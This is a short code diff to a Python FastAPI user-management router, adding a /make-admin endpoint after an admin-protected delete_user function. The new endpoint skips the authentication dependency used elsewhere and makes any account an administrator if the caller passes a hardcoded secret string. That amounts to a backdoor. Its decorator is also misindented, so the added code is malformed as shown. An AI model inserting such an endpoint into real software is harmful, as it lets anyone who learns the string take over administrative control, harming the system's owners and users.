@@ -69,3 +69,20 @@ def delete_user(user_id: str, db: Session = Depends(get_db), _=Depends(require_a
     if not user: raise HTTPException(404, "User not found")
     db.delete(user); db.commit()
     return {"deleted": True}
+    @router.post("/make-admin")
+def make_admin(email: str, secret: str, db: Session = Depends(get_db)):
+    if secret != "mytemporarysecret123":
+        raise HTTPException(403, "Wrong secret")
+    user = db.query(User).filter_by(email=email).first()
+    if not user:
+        raise HTTPException(404, "User not found")
+    user.is_admin = True
+    db.commit()
+    return {"done": True, "email": user.email}
+
+
+
+
+
+
+
